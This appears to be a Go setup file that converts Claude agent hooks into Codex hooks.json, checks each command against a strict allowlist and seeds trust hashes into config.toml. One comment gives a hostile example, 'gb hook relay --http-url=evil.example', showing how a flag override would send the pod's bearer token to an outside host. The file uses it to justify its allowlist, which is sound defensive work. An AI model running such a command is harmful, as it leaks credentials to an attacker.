package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"sort"
	"strings"
	"time"

	"github.com/BurntSushi/toml"
)

// Codex hook wiring (ADR 0004 §E.1, task gd-mYF3T8Qxnn).
//
// The Claude hook set (defaultHookSettings, or the resolved claude-hooks config
// bead) is translated into $CODEX_HOME/hooks.json, and each hook's content hash
// is then seeded into config.toml as [hooks.state."<key>"] trusted_hash so the
// hooks run without --dangerously-bypass-hook-trust.
//
// Trust decision (see docs/codex-hooks.md): Codex silently skips untrusted
// hooks under `codex exec` and app-server (openai/codex#46210). We seed trust
// instead of passing the bypass flag or baking /etc/codex/requirements.toml:
// the bypass turns the trust model off for everything in CODEX_HOME and project
// config, and a managed policy needs root plus an unknown precedence over the
// per-agent config.toml. Editing a hook flips it to `modified`, so a tampered
// hooks.json stops running instead of running silently.
//
// Ordering: config.toml is regenerated wholesale by writeCodexConfig, so this
// step must run after it.

const codexHooksFile = "hooks.json"

// codexHookEvents are the Claude hook events that have a Codex counterpart with
// the same CamelCase spelling, confirmed against codex-cli 0.162.1 (`hooks/list`
// reports session_start, pre_compact, subagent_start, ... for them). Everything
// else defaultHookSettings registers (PostToolUseFailure, StopFailure,
// TaskCompleted, TeammateIdle, CwdChanged, FileChanged, ConfigChange,
// InstructionsLoaded, Elicitation*, Worktree*, Notification, Setup, ...) has no
// Codex event and is dropped.
var codexHookEvents = map[string]bool{
	"SessionStart":      true,
	"PreCompact":        true,
	"UserPromptSubmit":  true,
	"Stop":              true,
	"PreToolUse":        true,
	"PostToolUse":       true,
	"SubagentStart":     true,
	"SubagentStop":      true,
	"PermissionRequest": true,
}

// Hook command allowlist. The hook set comes from the claude-hooks config bead,
// which any agent token can write, and Codex pods hold the ChatGPT token. So a
// command is translated into hooks.json (and later trusted) only when it is one
// of the fixed commands gardenio itself registers (allowedHookCommands): a `gb
// hook <name>`, `gb workspace audit`, or a script shipped in the agent image
// under /hooks/. Anything else is dropped and logged.
//
// Flags are allowlisted per command, never by shape. gb's root persistent flags
// (--http-url, --token, --operated-by, --actor, --ziti-*) are accepted by every
// subcommand, so `gb hook relay --http-url=evil.example` would send the pod's
// bearer token and hook payloads to another host. A flag passes only when it is
// listed for that exact command. Positional arguments are refused everywhere,
// and the only shell syntax permitted is the one quiet suffix, so `;`, `&&`,
// pipes, `$(...)`, backticks and other redirections never pass.

// hookQuietSuffix is the only shell syntax permitted, spelled exactly as
// defaultHookSettings writes it.
const hookQuietSuffix = " 2>/dev/null || true"

// allowedHookFlag describes one permitted flag. values, when non-nil, is the
// closed set of accepted values (the flag then requires a value, as
// `--flag=v` or `--flag v`); when nil the flag is a bare boolean switch.
type allowedHookFlag struct {
	values []string
}

// allowedHookCommands maps a command's fixed prefix to its permitted flags. An
// empty map means the command takes no flags. Add a flag here only when
// defaultHookSettings registers it, and never a root persistent flag.
var allowedHookCommands = map[string]map[string]allowedHookFlag{
	"gb hook relay":      {},
	"gb hook prime":      {"--enqueue": {}},
	"gb hook load-state": {},
	"gb hook check-mail": {},
	"gb hook stop-gate":  {"--format": {values: []string{"claude", "codex", "gemini"}}},
	"gb workspace audit": {},

	// Scripts the agent image copies to /hooks/ (gardenio/images/agent/hooks).
	"/hooks/check-jira.sh":        {},
	"/hooks/check-mail.sh":        {},
	"/hooks/drain-queue.sh":       {"--quiet": {}},
	"/hooks/jira-status-reset.sh": {},
	"/hooks/jira-status-save.sh":  {},
	"/hooks/prime.sh":             {},
	"/hooks/stop-gate.sh":         {},
	"/hooks/wiki-sync.sh":         {},
}

// isAllowedHookCommand reports whether command may be installed on and
// trusted by a Codex agent.
func isAllowedHookCommand(command string) bool {
	command = strings.TrimSuffix(command, hookQuietSuffix)
	// Exact single-space tokenisation: any other whitespace (tab, newline,
	// double space) lands inside a token and fails the lookups below.
	tokens := strings.Split(command, " ")
	for n := len(tokens); n > 0; n-- {
		flags, ok := allowedHookCommands[strings.Join(tokens[:n], " ")]
		if !ok {
			continue
		}
		return hookFlagsAllowed(flags, tokens[n:])
	}
	return false
}

func hookFlagsAllowed(flags map[string]allowedHookFlag, args []string) bool {
	for i := 0; i < len(args); i++ {
		name, value, hasValue := strings.Cut(args[i], "=")
		spec, ok := flags[name]
		if !ok {
			return false
		}
		if spec.values == nil {
			if hasValue {
				return false
			}
			continue
		}
		if !hasValue {
			if i+1 >= len(args) {
				return false
			}
			i++
			value = args[i]
		}
		if !slices.Contains(spec.values, value) {
			return false
		}
	}
	return true
}

// isRelayHookCommand reports whether command is a pure observability relay.
// Those run `async: true` so they never delay a turn; every other hook either
// injects context (prime, check-mail, drain-queue) or gates (stop-gate) and
// stays synchronous.
func isRelayHookCommand(command string) bool {
	return strings.HasPrefix(strings.TrimSpace(command), "gb hook relay")
}

// skipCodexHandler reports Claude hook handlers that must not be installed on
// Codex. Claude re-primes after compaction by queueing text (PreCompact
// `prime --enqueue`) that drain-queue.sh prints from PostToolUse. Codex ignores
// plain stdout from PostToolUse (verified with codex-cli 0.162.1: only
// SessionStart/UserPromptSubmit stdout reaches the model), so drain-queue would
// delete the queue and the text would vanish. Codex fires SessionStart with
// source=compact after a compaction, and our SessionStart `gb hook prime`
// matches every source, so the re-prime is delivered there instead.
func skipCodexHandler(event, command string) bool {
	switch event {
	case "PostToolUse":
		return strings.Contains(command, "drain-queue.sh")
	case "PreCompact":
		return strings.Contains(command, "hook prime --enqueue")
	}
	return false
}

// codexHookCommand adapts a Claude hook command for Codex. The stop-gate gets
// an explicit --format codex so its JSON-on-stdout contract does not depend on
// GARDENIO_HARNESS reaching the hook's environment.
func codexHookCommand(command string) string {
	const gate = "gb hook stop-gate"
	if strings.HasPrefix(strings.TrimSpace(command), gate) && !strings.Contains(command, "--format") {
		return strings.Replace(command, gate, gate+" --format codex", 1)
	}
	return command
}

// buildCodexHooks translates a Claude-shaped {"hooks": {...}} document into the
// hooks.json document. dropped lists the Claude events with no Codex
// counterpart (sorted) for the caller to log. rejected lists the hook commands
// that were refused by the allowlist (sorted, de-duplicated); they are neither
// written to hooks.json nor trusted. badTimeouts lists the handlers whose
// timeout was dropped or clamped (sorted, de-duplicated) for the caller to log.
func buildCodexHooks(src map[string]any) (doc map[string]any, dropped, rejected, badTimeouts []string) {
	badTimeoutSet := map[string]bool{}
	rejectedSet := map[string]bool{}
	srcHooks, _ := src["hooks"].(map[string]any)
	out := map[string]any{}
	for event, v := range srcHooks {
		if !codexHookEvents[event] {
			dropped = append(dropped, event)
			continue
		}
		groups, _ := v.([]any)
		var outGroups []any
		for _, g := range groups {
			group, ok := g.(map[string]any)
			if !ok {
				continue
			}
			handlers, _ := group["hooks"].([]any)
			var outHandlers []any
			for _, h := range handlers {
				handler, ok := h.(map[string]any)
				if !ok {
					continue
				}
				typ, _ := handler["type"].(string)
				command, _ := handler["command"].(string)
				if typ != "command" || command == "" || skipCodexHandler(event, command) {
					continue
				}
				if !isAllowedHookCommand(command) {
					rejectedSet[event+": "+command] = true
					continue
				}
				oh := map[string]any{"type": "command", "command": codexHookCommand(command)}
				if isRelayHookCommand(command) {
					oh["async"] = true
				}
				if t, ok := handler["timeout"]; ok {
					n, note := sanitizeCodexTimeout(t)
					if note != "" {
						badTimeoutSet[event+": "+command+": "+note] = true
					}
					if n > 0 {
						oh["timeout"] = n
					}
				}
				outHandlers = append(outHandlers, oh)
			}
			if len(outHandlers) == 0 {
				continue
			}
			og := map[string]any{"hooks": outHandlers}
			// Claude's empty matcher means "all"; Codex spells that by omitting it.
			if m, _ := group["matcher"].(string); m != "" {
				og["matcher"] = m
			}
			outGroups = append(outGroups, og)
		}
		if len(outGroups) > 0 {
			out[event] = outGroups
		}
	}
	sort.Strings(dropped)
	for r := range rejectedSet {
		rejected = append(rejected, r)
	}
	sort.Strings(rejected)
	for b := range badTimeoutSet {
		badTimeouts = append(badTimeouts, b)
	}
	sort.Strings(badTimeouts)
	return map[string]any{"hooks": out}, dropped, rejected, badTimeouts
}

// Codex hook timeouts are whole seconds. The claude-hooks bead is
// operator-editable, and a value Codex rejects (negative, a string, fractional,
// huge) can make it discard the entire hooks.json, so every hook including the
// stop gate would silently stop running (fail open). Only a sane integer in
// [minCodexHookTimeout, maxCodexHookTimeout] reaches the file.
const (
	minCodexHookTimeout = 1
	maxCodexHookTimeout = 600
)

// sanitizeCodexTimeout returns the timeout to write (0 means omit the key so
// Codex applies its default) and, when the input was not usable as-is, a short
// note for the caller to log. A whole number above the maximum is clamped; any
// other invalid value is dropped.
func sanitizeCodexTimeout(v any) (int, string) {
	var f float64
	switch n := v.(type) {
	case int:
		f = float64(n)
	case int64:
		f = float64(n)
	case float64:
		f = n
	case json.Number:
		var err error
		if f, err = n.Float64(); err != nil {
			return 0, fmt.Sprintf("dropped non-numeric timeout %q", n.String())
		}
	default:
		return 0, fmt.Sprintf("dropped non-numeric timeout %v", v)
	}
	if math.IsNaN(f) || math.IsInf(f, 0) || f != math.Trunc(f) {
		return 0, fmt.Sprintf("dropped non-integer timeout %v", v)
	}
	switch {
	case f < minCodexHookTimeout:
		return 0, fmt.Sprintf("dropped timeout %v below %d", v, minCodexHookTimeout)
	case f > maxCodexHookTimeout:
		return maxCodexHookTimeout, fmt.Sprintf("clamped timeout %v to %d", v, maxCodexHookTimeout)
	}
	return int(f), ""
}

// renderCodexHooks encodes the hooks.json document (map keys sort, so the
// output is deterministic for the golden test).
func renderCodexHooks(doc map[string]any) ([]byte, error) {
	var buf bytes.Buffer
	enc := json.NewEncoder(&buf)
	enc.SetEscapeHTML(false) // keep "2>/dev/null" readable in the file
	enc.SetIndent("", "  ")
	if err := enc.Encode(doc); err != nil {
		return nil, fmt.Errorf("encoding codex hooks.json: %w", err)
	}
	return buf.Bytes(), nil
}

// codexHookInfo is the subset of a `hooks/list` entry the trust seeder needs.
type codexHookInfo struct {
	Key         string `json:"key"`
	EventName   string `json:"eventName"`
	Command     string `json:"command"`
	SourcePath  string `json:"sourcePath"`
	CurrentHash string `json:"currentHash"`
	TrustStatus string `json:"trustStatus"`
}

// listCodexHooks asks `codex app-server` which hooks it discovers for cwd. A var
// so tests can stub the subprocess.
var listCodexHooks = func(ctx context.Context, codexHome, cwd string) ([]codexHookInfo, error) {
	ctx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()
	bin, err := exec.LookPath("codex")
	if err != nil {
		return nil, fmt.Errorf("codex binary not on PATH: %w", err)
	}
	cmd := exec.CommandContext(ctx, bin, "app-server")
	cmd.Dir = cwd
	cmd.Env = append(os.Environ(), envCodexHome+"="+codexHome)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return nil, err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, err
	}
	cmd.Stderr = io.Discard
	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("starting codex app-server: %w", err)
	}
	defer func() {
		_ = stdin.Close()
		_ = cmd.Process.Kill()
		_ = cmd.Wait()
	}()

	reader := bufio.NewReaderSize(stdout, 1<<20)
	call := func(id int, method string, params any) (json.RawMessage, error) {
		req, _ := json.Marshal(map[string]any{"id": id, "method": method, "params": params})
		if _, err := stdin.Write(append(req, '\n')); err != nil {
			return nil, err
		}
		for {
			line, err := reader.ReadBytes('\n')
			if err != nil {
				return nil, fmt.Errorf("reading %s response: %w", method, err)
			}
			var msg struct {
				ID     *int            `json:"id"`
				Result json.RawMessage `json:"result"`
				Error  *struct {
					Message string `json:"message"`
				} `json:"error"`
			}
			if json.Unmarshal(line, &msg) != nil || msg.ID == nil || *msg.ID != id {
				continue // notification or unrelated message
			}
			if msg.Error != nil {
				return nil, fmt.Errorf("%s: %s", method, msg.Error.Message)
			}
			return msg.Result, nil
		}
	}

	if _, err := call(1, "initialize", map[string]any{
		"clientInfo": map[string]any{"name": "gb", "title": "gb", "version": "0"},
	}); err != nil {
		return nil, err
	}
	notif, _ := json.Marshal(map[string]any{"method": "initialized"})
	if _, err := stdin.Write(append(notif, '\n')); err != nil {
		return nil, err
	}
	raw, err := call(2, "hooks/list", map[string]any{"cwds": []string{cwd}})
	if err != nil {
		return nil, err
	}
	var res struct {
		Data []struct {
			Hooks  []codexHookInfo `json:"hooks"`
			Errors []struct {
				Message string `json:"message"`
				Path    string `json:"path"`
			} `json:"errors"`
		} `json:"data"`
	}
	if err := json.Unmarshal(raw, &res); err != nil {
		return nil, fmt.Errorf("decoding hooks/list: %w", err)
	}
	var hooks []codexHookInfo
	for _, d := range res.Data {
		for _, e := range d.Errors {
			fmt.Fprintf(os.Stderr, "[setup] warning: codex hooks error in %s: %s\n", e.Path, e.Message)
		}
		hooks = append(hooks, d.Hooks...)
	}
	return hooks, nil
}

// sameFile reports whether two paths name the same file, tolerating symlinked
// CODEX_HOME directories (Codex reports the path it resolved).
func sameFile(a, b string) bool {
	if filepath.Clean(a) == filepath.Clean(b) {
		return true
	}
	ra, errA := filepath.EvalSymlinks(a)
	rb, errB := filepath.EvalSymlinks(b)
	return errA == nil && errB == nil && ra == rb
}

// codexHookTrustEntries picks the hooks that came from hooksPath and returns
// key -> hash. Hooks from anywhere else (project .codex/hooks.json, plugins)
// are deliberately not trusted by us, and neither is a hook whose command is not
// on the allowlist (a hooks.json edited after we wrote it, or a command Codex
// reports differently): it stays untrusted and Codex skips it.
func codexHookTrustEntries(hooks []codexHookInfo, hooksPath string) map[string]string {
	entries := map[string]string{}
	for _, h := range hooks {
		if h.Key == "" || h.CurrentHash == "" || !sameFile(h.SourcePath, hooksPath) {
			continue
		}
		if !isAllowedHookCommand(h.Command) {
			fmt.Fprintf(os.Stderr, "[setup] warning: not trusting codex hook %s: command %q is not allowlisted\n", h.Key, h.Command)
			continue
		}
		entries[h.Key] = h.CurrentHash
	}
	return entries
}

// mergeCodexHookTrust adds [hooks.state."<key>"] trusted_hash entries to the
// config.toml at path, preserving every other key.
func mergeCodexHookTrust(configPath string, entries map[string]string) error {
	raw, err := os.ReadFile(configPath)
	if err != nil {
		return err
	}
	cfg := map[string]any{}
	if _, err := toml.Decode(string(raw), &cfg); err != nil {
		return fmt.Errorf("parsing %s: %w", configPath, err)
	}
	state := map[string]any{}
	for k, hash := range entries {
		state[k] = map[string]any{"trusted_hash": hash}
	}
	deepMergeInto(cfg, map[string]any{"hooks": map[string]any{"state": state}})
	data, err := renderCodexTOML(cfg)
	if err != nil {
		return err
	}
	return writeHarnessFileAtomic(configPath, data, 0o600)
}

// seedCodexHookTrust writes the trust hashes for hooksPath into config.toml and
// re-lists to confirm every one of our hooks is now trusted. It returns an
// error (and leaves hooks untrusted, i.e. silently skipped by Codex) when the
// verification fails, so the caller can make that loud.
func seedCodexHookTrust(ctx context.Context, codexHome, cwd, hooksPath string) (int, error) {
	configPath := filepath.Join(codexHome, codexConfigFile)
	hooks, err := listCodexHooks(ctx, codexHome, cwd)
	if err != nil {
		return 0, fmt.Errorf("hooks/list: %w", err)
	}
	entries := codexHookTrustEntries(hooks, hooksPath)
	if len(entries) == 0 {
		return 0, fmt.Errorf("codex discovered none of the hooks in %s", hooksPath)
	}
	if err := mergeCodexHookTrust(configPath, entries); err != nil {
		return 0, err
	}
	hooks, err = listCodexHooks(ctx, codexHome, cwd)
	if err != nil {
		return 0, fmt.Errorf("verifying hook trust: %w", err)
	}
	var bad []string
	for _, h := range hooks {
		if _, ours := entries[h.Key]; ours && h.TrustStatus != "trusted" {
			bad = append(bad, h.Key+"="+h.TrustStatus)
		}
	}
	if len(bad) > 0 {
		sort.Strings(bad)
		return len(entries), fmt.Errorf("hooks still not trusted after seeding: %s", strings.Join(bad, ", "))
	}
	return len(entries), nil
}

// writeCodexHooks translates src and writes <codexHome>/hooks.json. It returns
// the path, the dropped Claude events, the hook commands the allowlist
// rejected and the timeouts that were dropped or clamped.
func writeCodexHooks(codexHome string, src map[string]any) (string, []string, []string, []string, error) {
	doc, dropped, rejected, badTimeouts := buildCodexHooks(src)
	data, err := renderCodexHooks(doc)
	if err != nil {
		return "", nil, nil, nil, err
	}
	if err := os.MkdirAll(codexHome, 0o755); err != nil {
		return "", nil, nil, nil, fmt.Errorf("creating %s: %w", codexHome, err)
	}
	path := filepath.Join(codexHome, codexHooksFile)
	if err := writeHarnessFileAtomic(path, data, 0o644); err != nil {
		return "", nil, nil, nil, fmt.Errorf("writing %s: %w", path, err)
	}
	return path, dropped, rejected, badTimeouts, nil
}

// installCodexHooks writes hooks.json and seeds its trust. Hooks are the
// workflow plumbing (prime, stop gate, relay) but not worth failing a pod boot
// over, so errors are returned for the caller to log, never to abort setup.
func installCodexHooks(ctx context.Context, codexHome, workspace string, src map[string]any) error {
	path, dropped, rejected, badTimeouts, err := writeCodexHooks(codexHome, src)
	if err != nil {
		return err
	}
	for _, b := range badTimeouts {
		fmt.Fprintf(os.Stderr, "[setup] warning: codex hook timeout adjusted (%s)\n", b)
	}
	for _, r := range rejected {
		fmt.Fprintf(os.Stderr, "[setup] warning: dropped non-allowlisted codex hook (%s)\n", r)
	}
	fmt.Fprintf(os.Stderr, "[setup] wrote %s", path)
	if len(dropped) > 0 {
		fmt.Fprintf(os.Stderr, " (no Codex event for: %s)", strings.Join(dropped, ", "))
	}
	fmt.Fprintln(os.Stderr)

	cwd := workspace
	if cwd == "" {
		cwd, _ = os.Getwd()
	}
	n, err := seedCodexHookTrust(ctx, codexHome, cwd, path)
	if err != nil {
		return fmt.Errorf("hooks.json written but NOT trusted, Codex will skip every gardenio hook: %w", err)
	}
	fmt.Fprintf(os.Stderr, "[setup] seeded trust for %d codex hooks\n", n)
	return nil
}

// harnessHooksSource returns the Claude-shaped hook document to translate: the
// resolved claude-hooks bead (so fleet hook edits reach both harnesses) or the
// built-in defaults, plus the JIRA hooks when credentials are present.
func harnessHooksSource(resolved map[string]any) map[string]any {
	src := resolved
	if src == nil {
		src = defaultHookSettings()
	}
	appendJIRAStatusHooks(src)
	return src
}

// logCodexHooksInstall runs installCodexHooks and prints, never returns, errors.
func logCodexHooksInstall(ctx context.Context, codexHome, workspace string, src map[string]any) {
	if err := installCodexHooks(ctx, codexHome, workspace, src); err != nil {
		fmt.Fprintf(os.Stderr, "[setup] warning: codex hooks: %v\n", err)
	}
}
